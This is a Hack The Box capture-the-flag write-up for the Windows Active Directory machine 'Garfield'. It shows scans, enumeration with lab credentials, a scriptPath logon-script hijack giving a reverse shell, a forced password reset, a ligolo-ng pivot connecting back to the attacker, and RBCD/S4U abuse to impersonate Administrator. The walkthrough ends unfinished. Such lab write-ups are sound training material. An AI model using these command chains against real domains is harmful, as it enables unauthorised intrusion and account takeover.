



# 🐱 Garfield — HackTheBox Writeup

**Platform:** [Hack The Box](https://app.hackthebox.com/machines/Garfield)  
**Difficulty:** `Hard`  
**OS:** `Windows`  
**Description:** `As is common in real life pentests, you will start the Garfield box with credentials for the following account j.arbuckle / Th1sD4mnC4t!@1978`
---


## Reconnaissance

Today , we will hack a hard machine from HackTheBox named Garfield. It is so interesting and a bit difficult to understand. Lets start with nmapping to identify which ports are open and what services running on them.

```bash
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Garfield]
└─$ cat rustscan.out
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
With RustScan, I scan ports so fast, even my firewall gets whiplash 💨

[~] The config file is expected to be at "/home/samurai/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.129.33.43:53
Open 10.129.33.43:88
Open 10.129.33.43:135
Open 10.129.33.43:139
Open 10.129.33.43:389
Open 10.129.33.43:445
Open 10.129.33.43:593
Open 10.129.33.43:636
Open 10.129.33.43:2179
Open 10.129.33.43:3269
Open 10.129.33.43:3268
Open 10.129.33.43:3389
Open 10.129.33.43:464
Open 10.129.33.43:5985
Open 10.129.33.43:9389
Open 10.129.33.43:49667
Open 10.129.33.43:49674
Open 10.129.33.43:49675
Open 10.129.33.43:49677
Open 10.129.33.43:49678
Open 10.129.33.43:49889
Open 10.129.33.43:49917
[~] Starting Script(s)
[~] Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-11 15:51 +0400
Initiating Ping Scan at 15:51
Scanning 10.129.33.43 [4 ports]
Completed Ping Scan at 15:51, 0.19s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 15:51
Scanning garfield.htb (10.129.33.43) [22 ports]
Discovered open port 53/tcp on 10.129.33.43
Discovered open port 139/tcp on 10.129.33.43
Discovered open port 49889/tcp on 10.129.33.43
Discovered open port 445/tcp on 10.129.33.43
Discovered open port 3389/tcp on 10.129.33.43
Discovered open port 3268/tcp on 10.129.33.43
Discovered open port 389/tcp on 10.129.33.43
Discovered open port 135/tcp on 10.129.33.43
Discovered open port 49677/tcp on 10.129.33.43
Discovered open port 464/tcp on 10.129.33.43
Discovered open port 49678/tcp on 10.129.33.43
Discovered open port 49674/tcp on 10.129.33.43
Discovered open port 3269/tcp on 10.129.33.43
Discovered open port 49675/tcp on 10.129.33.43
Discovered open port 88/tcp on 10.129.33.43
Discovered open port 5985/tcp on 10.129.33.43
Discovered open port 2179/tcp on 10.129.33.43
Discovered open port 636/tcp on 10.129.33.43
Discovered open port 49917/tcp on 10.129.33.43
Discovered open port 49667/tcp on 10.129.33.43
Discovered open port 593/tcp on 10.129.33.43
Discovered open port 9389/tcp on 10.129.33.43
Completed SYN Stealth Scan at 15:51, 0.36s elapsed (22 total ports)
Nmap scan report for garfield.htb (10.129.33.43)
Host is up, received echo-reply ttl 127 (0.16s latency).
Scanned at 2026-04-11 15:51:28 +04 for 0s

PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
2179/tcp  open  vmrdp            syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
3389/tcp  open  ms-wbt-server    syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49674/tcp open  unknown          syn-ack ttl 127
49675/tcp open  unknown          syn-ack ttl 127
49677/tcp open  unknown          syn-ack ttl 127
49678/tcp open  unknown          syn-ack ttl 127
49889/tcp open  unknown          syn-ack ttl 127
49917/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.63 seconds
           Raw packets sent: 26 (1.120KB) | Rcvd: 23 (996B)


┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Garfield]
└─$ cat nmap.out    
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-11 15:51 +0400
Nmap scan report for garfield.htb (10.129.33.43)
Host is up (0.20s latency).
Not shown: 986 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-11 19:50:43Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: garfield.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: garfield.htb, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-04-11T19:51:57+00:00; +7h59m00s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: GARFIELD
|   NetBIOS_Domain_Name: GARFIELD
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: garfield.htb
|   DNS_Computer_Name: DC01.garfield.htb
|   DNS_Tree_Name: garfield.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2026-04-11T19:51:17+00:00
| ssl-cert: Subject: commonName=DC01.garfield.htb
| Not valid before: 2026-02-13T01:10:36
|_Not valid after:  2026-08-15T01:10:36
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h58m59s, deviation: 0s, median: 7h58m59s
| smb2-time: 
|   date: 2026-04-11T19:51:20
|_  start_date: N/A

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   238.63 ms 10.10.14.1
2   238.70 ms garfield.htb (10.129.33.43)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.71 seconds
```

---


### Core Active Directory Services

| Port | Service | Notes |
|------|---------|-------|
| `53/tcp` | DNS | AD relies on DNS for DC and service location |
| `88/tcp` | Kerberos | Auth — target for AS-REP Roasting, Kerberoasting |
| `389/tcp` | LDAP | Enumerate users, groups, SPNs |
| `636/tcp` | LDAPS | TLS LDAP — `tcpwrapped` |
| `3268/tcp` | Global Catalog | Forest-wide directory queries |
| `3269/tcp` | Global Catalog TLS | `tcpwrapped` |
| `464/tcp` | kpasswd | Kerberos password change |

### Windows RPC / SMB

| Port | Service | Notes |
|------|---------|-------|
| `135/tcp` | MSRPC | RPC endpoint mapper |
| `139/tcp` | NetBIOS-SSN | Legacy SMB session service |
| `445/tcp` | SMB | Signing **required** — relay attacks blocked |
| `593/tcp` | RPC over HTTP | Tunneled RPC, used by remote management |

### Remote Access

| Port | Service | Notes |
|------|---------|-------|
| `3389/tcp` | RDP | Cert CN: `DC01.garfield.htb` |
| `5985/tcp` | WinRM | PowerShell remoting — `evil-winrm` with valid creds |
| `2179/tcp` | Hyper-V RDP | VM Connect — DC runs Hyper-V |


---

## Enumeration

Lets start enumerating shares / users via credentials provided in description --> j.arbuckle : Th1sD4mnC4t!@1978


```bash
                                                                                                                                                                                              
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Garfield]
└─$ netexec smb garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' --shares
SMB         10.129.33.43    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:garfield.htb) (signing:True) (SMBv1:False) 
SMB         10.129.33.43    445    DC01             [+] garfield.htb\j.arbuckle:Th1sD4mnC4t!@1978 
SMB         10.129.33.43    445    DC01             [*] Enumerated shares
SMB         10.129.33.43    445    DC01             Share           Permissions     Remark
SMB         10.129.33.43    445    DC01             -----           -----------     ------
SMB         10.129.33.43    445    DC01             ADMIN$                          Remote Admin
SMB         10.129.33.43    445    DC01             C$                              Default share
SMB         10.129.33.43    445    DC01             IPC$            READ            Remote IPC
SMB         10.129.33.43    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.33.43    445    DC01             SYSVOL          READ            Logon server share 
                                                                                                                                                                                              
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Garfield]
└─$ netexec smb garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' --users
SMB         10.129.33.43    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:garfield.htb) (signing:True) (SMBv1:False) 
SMB         10.129.33.43    445    DC01             [+] garfield.htb\j.arbuckle:Th1sD4mnC4t!@1978 
SMB         10.129.33.43    445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.129.33.43    445    DC01             Administrator                 2025-10-03 17:29:26 0       Built-in account for administering the computer/domain 
SMB         10.129.33.43    445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.129.33.43    445    DC01             krbtgt                        2025-08-13 11:05:26 0       Key Distribution Center Service Account 
SMB         10.129.33.43    445    DC01             krbtgt_8245                   2025-08-17 11:33:39 0       Key Distribution Center service account for read-only domain controller 
SMB         10.129.33.43    445    DC01             j.arbuckle                    2025-09-09 15:50:55 0        
SMB         10.129.33.43    445    DC01             l.wilson                      2026-01-27 21:40:33 0        
SMB         10.129.33.43    445    DC01             l.wilson_adm                  2026-01-13 14:56:35 0        
SMB         10.129.33.43    445    DC01             [*] Enumerated 7 local users: GARFIELD

```

Perfect, we have important findings on our hands. Next we need to use bloodhound to see the view of connections among the users and groups.

Now we can use Bloodhound and BloodyAD tool which is amazing for this situation. 

```bash
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Garfield]
└─$ bloodyAD --host garfield.htb -d garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' get writable

distinguishedName: CN=Guest,CN=Users,DC=garfield,DC=htb
permission: WRITE

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=garfield,DC=htb
permission: WRITE

distinguishedName: CN=krbtgt_8245,CN=Users,DC=garfield,DC=htb
permission: WRITE

distinguishedName: CN=Jon Arbuckle,CN=Users,DC=garfield,DC=htb
permission: WRITE

distinguishedName: CN=Liz Wilson,CN=Users,DC=garfield,DC=htb
permission: WRITE

distinguishedName: CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb
permission: WRITE
```

Here we can identify Arbuckle has write permission on Liz Wilson user. When obtaining additional details from bloodhound , We can use scriptPath attack . And also we find nondefault file on scripts folder under SYSVOL Share

```bash
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Garfield]
└─$ smbclient //10.129.33.43/SYSVOL -U 'j.arbuckle%Th1sD4mnC4t!@1978'
Try "help" to get a list of possible commands.
smb: \> cd garfield.htb\
cdsmb: \garfield.htb\> cd scripts\
lsmb: \garfield.htb\scripts\> ls
  .                                   D        0  Wed Jan 28 02:13:47 2026
  ..                                  D        0  Wed Jan 28 02:13:47 2026
  printerDetect.bat                   A     1401  Sun Apr 12 00:19:49 2026

		9250815 blocks of size 4096. 967879 blocks available
smb: \garfield.htb\scripts\> 

```

Perfect , now we can upload our malicious file and then trigger it to get us reverse shell!!

```bash
└─$ smbclient //10.129.33.43/SYSVOL -U 'j.arbuckle%Th1sD4mnC4t!@1978'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Aug 13 15:04:43 2025
  ..                                  D        0  Wed Aug 13 15:04:43 2025
  garfield.htb                       Dr        0  Wed Aug 13 15:04:43 2025
cd
		9250815 blocks of size 4096. 967880 blocks available
smb: \> cd garfield.htb\
smb: \garfield.htb\> cd scripts\
smb: \garfield.htb\scripts\> put printerDetect.bat
putting file printerDetect.bat as \garfield.htb\scripts\printerDetect.bat (2.4 kB/s) (average 2.4 kB/s)
```

next we need to change scriptPath of target user -> 

```bash
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Garfield]
└─$ bloodyAD --host 10.129.33.43 -d garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' set object "CN=Liz Wilson,CN=Users,DC=garfield,DC=htb" scriptPath -v printerDetect.bat
[+] CN=Liz Wilson,CN=Users,DC=garfield,DC=htb's scriptPath has been updated.
```

## Initial Access

```bash
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Garfield]
└─$ rlwrap nc -lnvp 9001                                 
listening on [any] 9001 ...
connect to [10.10.14.149] from (UNKNOWN) [10.129.33.43] 53964
whoami
garfield\l.wilson
PS C:\Windows\system32> 
```

Amazing , We got our initial access.
Once we have shell access to wilson user , found out this user has ForceChangePassword permission on wilson_adm user. Its perfect to abuse and get its reverse shell! Lets do this->

```bash
PS C:\Windows\system32> $user = [ADSI]"LDAP://CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb"
PS C:\Windows\system32> $user.SetPassword("Garfield_HTB_Admin_2026!@#")
PS C:\Windows\system32> $user.CommitChanges()
```

Perfect and to validate it is changed we can quickly use crackmapexec tool 

```bash
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Garfield]
└─$ crackmapexec smb 10.129.33.43 -u 'l.wilson_adm' -p 'Garfield_HTB_Admin_2026!@#'
SMB         10.129.33.43    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:garfield.htb) (signing:True) (SMBv1:False)
SMB         10.129.33.43    445    DC01             [+] garfield.htb\l.wilson_adm:Garfield_HTB_Admin_2026!@# 
  ```


Amazing! Password change verified. and we can use evil-winrm to connect and grab our user flag) 

```bash
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> ls ..\Desktop


    Directory: C:\Users\l.wilson_adm\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        4/11/2026  12:41 PM             34 user.txt


*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> type ..\Desktop\user.txt
00ad28a3ee5abba46512d287fdc95d3f
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> 

```

## Privilege Escalation (RODC)

Following successful authentication as l.wilson_adm on the primary target, further enumeration revealed the existence of an isolated internal network segment (192.168.100.0/24). This subnet houses a Read-Only Domain Controller (RODC01) at the IP address 192.168.100.2. To interact with this internal network, a pivot through the compromised host (DC01) was required.

We will use ligolo-ng tool which is widely used for pivoting and port forwarding.

```bash
*Evil-WinRM* PS C:\Temp> upload agent.exe
                                        
Info: Uploading /home/samurai/HTB/HTB-reports/Manual-WriteUps/Garfield/agent.exe to C:\Temp\agent.exe
                                        
Data: 9736872 bytes of 9736872 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Temp> .\agent.exe -connect 10.10.14.149:11601 -ignore-cert
agent.exe : time="2026-04-11T13:47:41-07:00" level=warning msg="warning, certificate validation disabled"
    + CategoryInfo          : NotSpecified: (time="2026-04-1...ation disabled":String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
time="2026-04-11T13:47:41-07:00" level=info msg="Connection established" addr="10.10.14.149:11601"
```

```bash
└─$ ./proxy -selfcert
INFO[0000] Loading configuration file ligolo-ng.yaml    
WARN[0000] daemon configuration file not found. Creating a new one... 
? Enable Ligolo-ng WebUI? No
WARN[0002] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
ERRO[0002] Certificate cache error: acme/autocert: certificate cache miss, returning a new certificate 
INFO[0002] Listening on 0.0.0.0:11601                   
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

  Made in France ♥            by @Nicocha30!
  Version: 0.8.3

ligolo-ng » INFO[0455] Agent joined.                                 id=00155d0bdd00 name="GARFIELD\\l.wilson_adm@DC01" remote="10.129.33.43:54255"
ligolo-ng » start
error: please, select an agent using the session command
ligolo-ng » session
? Specify a session : 1 - GARFIELD\l.wilson_adm@DC01 - 10.129.33.43:54255 - 00155d0bdd00
[Agent : GARFIELD\l.wilson_adm@DC01] » start
INFO[0465] Starting tunnel to GARFIELD\l.wilson_adm@DC01 (00155d0bdd00) 
[Agent : GARFIELD\l.wilson_adm@DC01] »  

```

And after enumerating privileges using bloodhound , we found this-> 

```bash
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> 
```

This user has SeMachineAccountPrivilege privilege . Enumeration confirmed that the l.wilson_adm account can be added to the RODC Administrators group. Members of this group possess the necessary Access Control Entries (ACEs) to modify the msDS-AllowedToActOnBehalfOfOtherIdentity attribute of the Read-Only Domain Controller (RODC01$). This misconfiguration allows an attacker to configure RBCD and impersonate a privileged account (such as Administrator) on the target machine.

First, we have to add ourself to RODC group -> 

```bash
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Garfield]
└─$ bloodyAD --host garfield.htb -u l.wilson_adm -p 'Garfield_HTB_Admin_2026!@#' add groupMember "RODC Administrators" l.wilson_adm
[+] l.wilson_adm added to RODC Administrators
```

Once added successfully , we can create computer account on target -> 

```bash
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Garfield]
└─$ impacket-addcomputer -computer-name 'samurai' -computer-pass 'Password123!' -dc-ip 10.129.33.43 garfield.htb/l.wilson_adm:'Garfield_HTB_Admin_2026!@#'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account samurai$ with password Password123!.
```

With the controlled machine account established, impacket-rbcd was utilized to modify the Active Directory schema -> 
```bash
impacket-rbcd -action write -delegate-from 'samurai$' -delegate-to 'RODC01$' -dc-ip 10.129.33.43 garfield.htb/l.wilson_adm:Password123!
```

Leveraging the newly configured RBCD rights, impacket-getST was executed to perform the Kerberos protocol extensions: Service for User to Self (S4U2self) and Service for User to Proxy (S4U2proxy). This generated a valid Kerberos Service Ticket (ST) for the cifs service on RODC01, successfully impersonating the Administrator account.

```bash
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Garfield]
└─$ impacket-getST -spn 'cifs/RODC01.garfield.htb' \
  -impersonate Administrator \
  -altservice host \
  -dc-ip 10.129.33.43 \
  garfield.htb/'samurai$':'Password123!'

export KRB5CCNAME=Administrator@host_RODC01.garfield.htb@GARFIELD.HTB.ccache

impacket-wmiexec -k -no-pass -dc-ip 10.129.33.43 \
  garfield.htb/Administrator@RODC01.garfield.htb
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Changing service from cifs/RODC01.garfield.htb@GARFIELD.HTB to host/RODC01.garfield.htb@GARFIELD.HTB
[*] Saving ticket in Administrator@host_RODC01.garfield.htb@GARFIELD.HTB.ccache
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>ls
```

Perfect , We are the administrator on RODC01.

Further enumeration showed us this administrator has high privilege group membership which are Domain Admins and Enterprise Admins

```bash
C:\>whoami /groups

GROUP INFORMATION
-----------------

Group Name                                      Type             SID                                          Attributes                                                     
=============================================== ================ ============================================ ===============================================================
Everyone                                        Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group             
BUILTIN\Administrators                          Alias            S-1-5-32-544                                 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                                   Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group             
BUILTIN\Pre-Windows 2000 Compatible Access      Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\NETWORK                            Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\Authenticated Users                Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\This Organization                  Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group             
GARFIELD\Group Policy Creator Owners            Group            S-1-5-21-2502726253-3859040611-225969357-520 Mandatory group, Enabled by default, Enabled group             
GARFIELD\Domain Admins                          Group            S-1-5-21-2502726253-3859040611-225969357-512 Mandatory group, Enabled by default, Enabled group             
GARFIELD\Enterprise Admins                      Group            S-1-5-21-2502726253-3859040611-225969357-519 Mandatory group, Enabled by default, Enabled group             
GARFIELD\Schema Admins                          Group            S-1-5-21-2502726253-3859040611-225969357-518 Mandatory group, Enabled by default, Enabled group             
Service asserted identity                       Well-known group S-1-18-2                                     Mandatory group, Enabled by default, Enabled group             
GARFIELD\Denied RODC Password Replication Group Alias            S-1-5-21-2502726253-3859040611-225969357-572 Mandatory group, Enabled by default, Enabled group, Local Group
Mandatory Label\High Mandatory Level            Label            S-1-16-12288                                                                                                
```

Actually , i could not continue from here i progressed. I found its write up but i dont want to share what i dont know exactly what used and what techniques utilized. See you).


